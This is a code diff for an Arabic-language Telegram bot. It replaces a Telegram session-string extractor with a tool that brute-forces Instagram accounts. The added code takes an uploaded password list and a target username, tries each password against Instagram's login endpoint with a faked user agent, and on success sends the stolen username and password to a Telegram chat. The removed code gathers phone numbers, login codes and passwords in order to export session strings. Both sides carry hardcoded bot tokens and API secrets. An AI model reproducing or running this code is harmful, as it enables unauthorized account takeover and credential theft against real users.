@@ -1,76 +1,149 @@
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+import requests
+from user_agent import generate_user_agent
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
+import time
 
-# إعدادات البوت
-API_ID = 28384147  # ضع هنا API ID
-API_HASH = "1508ece11802e6214b4138e5917fef4b"  # ضع هنا API Hash
-BOT_TOKEN = "7611194546:AAEPJ_xSoDH3sS3112qQoJH78LIV1jgxkkA"  # ضع هنا توكن البوت
+# خلي توكن وايدي جوه
+BOT_TOKEN = "7611194546:AAEPJ_xSoDH3sS3112qQoJH78LIV1jgxkkA"
+ADMIN_ID = "7115002714"
 
-# إنشاء البوت
-app = Client("session_extractor", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+passwords = []
+target_user = ""
+failed_attempts = 0
+successful_attempts = 0
+report_message = None
+is_running = False
+start_time = None
 
-# تخزين البيانات في القاموس
-storage = {}
+def start(update, context):
+    chat_id = update.message.chat_id
+    welcome_text = f"""⥃ مرحبا بك عزيزي في بوت اختراق محدد | انستا ♯ 
+⥃ البوت يتميز بخدمة الاختراق و الـ ViP ✰
+⥃ البوت يتميز بسرعة تنفيذ الاختراق ⥉
+الـ 𝚒𝚍 الخاص بك ⥃ {chat_id}. 👤"""
+    keyboard = [
+        [InlineKeyboardButton("⛧ بدء اختراق ⛧", callback_data="start_bruteforce"),
+         InlineKeyboardButton("⛧ إيقاف اختراق ⛧", callback_data="stop_bruteforce")],
+        [InlineKeyboardButton("إضافة ملف باسورد 📂", callback_data="add_passwords")],
+        [InlineKeyboardButton("  ֺ۪ ⭒ قناة البوت ⭒ ֺ۪", url="https://t.me/Scorpion_scorp"),
+         InlineKeyboardButton("  ֺ۪ ⭒ المبرمج ⭒ ֺ۪ ", url="https://t.me/I_e_e_l")],
+        [InlineKeyboardButton("⚠️ كيفية الاستخدام⚠️", url="https://t.me/I_e_e_l")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=reply_markup)
 
-# رسالة البداية
-WELCOME_MESSAGE = "🎉 مرحبًا! أرسل رقم الهاتف لبدء استخراج الجلسة."
-WELCOME_BUTTONS = InlineKeyboardMarkup(
-    [[InlineKeyboardButton("📢 قناة السورس", url="https://t.me/source_channel")]]
-)
+def add_passwords(update, context):
+    query = update.callback_query
+    query.answer()
+    query.edit_message_text(text="دز ملف الباسوردات بصيغه (txt)")
 
+def handle_file(update, context):
+    global passwords
+    file = update.message.document
+    if file:
+        file_id = file.file_id
+        file_obj = context.bot.get_file(file_id)
+        file_content = file_obj.download_as_bytearray().decode('utf-8')
+        passwords = file_content.splitlines()
+        update.message.reply_text(f"تمت إضافة {len(passwords)} كلمة مرور")
 
-@app.on_message(filters.command("start"))
-async def start(client, message):
-    await message.reply_text(WELCOME_MESSAGE, reply_markup=WELCOME_BUTTONS)
+def start_bruteforce(update, context):
+    global is_running, start_time
+    query = update.callback_query
+    query.answer()
+    query.edit_message_text(text="دز يوزر نيم الحساب ب @")
+    context.user_data["awaiting_username"] = True
+    is_running = True
+    start_time = time.time()
 
+def stop_bruteforce(update, context):
+    global is_running
+    query = update.callback_query
+    query.answer()
+    is_running = False
+    elapsed_time = int(time.time() - start_time)
+    query.edit_message_text(
+        text=f"تم إيقاف الاختراق\n\n"
+             f"محاولات فاشلة: {failed_attempts}\n"
+             f"محاولات صحيحة: {successful_attempts}\n"
+             f"مدة التشغيل: {elapsed_time} ثانية"
+    )
 
-@app.on_message(filters.private & ~filters.command("start"))
-async def handle_messages(client, message):
-    try:
-        user_id = message.from_user.id
-        text = message.text
+def handle_username(update, context):
+    global target_user, failed_attempts, successful_attempts, report_message
+    if context.user_data.get("awaiting_username"):
+        target_user = update.message.text
+        failed_attempts = 0
+        successful_attempts = 0
+        chat_id = update.message.chat_id
+        report_message = context.bot.send_message(chat_id=chat_id, text="بدء الاختراق...\n\nمحاولات فاشلة: 0\nمحاولات صحيحة: 0\nكلمات المرور المتبقية: 0")
+        context.user_data["awaiting_username"] = False
+        brute_force(chat_id, context.bot)
 
-        # الخطوة 1: جمع رقم الهاتف
-        if user_id not in storage or "phone_number" not in storage[user_id]:
-            storage[user_id] = {"phone_number": text}
-            await message.reply_text("📩 أدخل الآن كود التحقق الذي وصلك:")
-            return
+def brute_force(chat_id, bot):
+    global passwords, target_user, failed_attempts, successful_attempts, report_message, is_running
+    url = 'https://www.instagram.com/accounts/login/ajax/'
+    headers = {
+        'accept': '*/*',
+        'accept-encoding': 'gzip,deflate,br',
+        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+        'content-length': '269',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/',
+        'user-agent': generate_user_agent(),
+        'x-csrftoken': 'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
+        'x-ig-app-id': '936619743392459',
+        'x-requested-with': 'XMLHttpRequest'
+    }
 
-        # الخطوة 2: جمع كود التحقق
-        if "code" not in storage[user_id]:
-            storage[user_id]["code"] = text
-            phone_number = storage[user_id]["phone_number"]
+    for password in passwords.copy():
+        if not is_running:
+            break
 
-            async with Client(":memory:", api_id=API_ID, api_hash=API_HASH) as temp_client:
-                try:
-                    await temp_client.sign_in(phone_number, storage[user_id]["code"])
+        data = {
+            'username': target_user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
+            'queryParams': '{}',
+            'optIntoOneTap': 'false'
+        }
+        response = requests.post(url, headers=headers, data=data)
 
-                    # إذا كان الحساب محميًا بكلمة مرور
-                    if "password" not in storage[user_id]:
-                        await message.reply_text("🔒 الحساب محمي بكلمة مرور. أدخلها الآن:")
-                        return
+        if 'userId' in response.text:
+            successful_attempts += 1
+            passwords.remove(password)
+            send = f'''https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={chat_id}&text= • ♠️ تم اختراق الحساب من قبل ابن بابل
+            
+user →: {target_user} 
+pass →: {password}'''
+            requests.post(send)
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=report_message.message_id,
+                text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
+            )
+            break
+        else:
+            failed_attempts += 1
+            passwords.remove(password)
+            bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=report_message.message_id,
+                text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
+            )
 
-                    password = storage[user_id]["password"]
-                    await temp_client.check_password(password)
+    bot.send_message(chat_id, "انتهت العمليه 🕑")
 
-                    # استخراج الجلسة
-                    session_string = await temp_client.export_session_string()
-                    await temp_client.send_message(
-                        "me", f"🎉 **تم استخراج الجلسة بنجاح:**\n\n`{session_string}`"
-                    )
-                    await message.reply_text(
-                        "✅ تم استخراج الجلسة بنجاح! تم إرسالها إلى رسائلك المحفوظة."
-                    )
-                except Exception as e:
-                    await message.reply_text(f"❌ حدث خطأ أثناء العملية:\n{e}")
+updater = Updater(BOT_TOKEN, use_context=True)
+dp = updater.dispatcher
 
-        # الخطوة 3: جمع كلمة المرور (إذا لزم)
-        elif "password" not in storage[user_id]:
-            storage[user_id]["password"] = text
+dp.add_handler(CommandHandler("start", start))
+dp.add_handler(CallbackQueryHandler(add_passwords, pattern="add_passwords"))
+dp.add_handler(CallbackQueryHandler(start_bruteforce, pattern="start_bruteforce"))
+dp.add_handler(CallbackQueryHandler(stop_bruteforce, pattern="stop_bruteforce"))
+dp.add_handler(MessageHandler(Filters.document, handle_file))
+dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_username))
 
-    except Exception as e:
-        await message.reply_text(f"❌ حدث خطأ: {e}")
-
-
-# تشغيل البوت
-app.run()
+updater.start_polling()
+updater.idle()
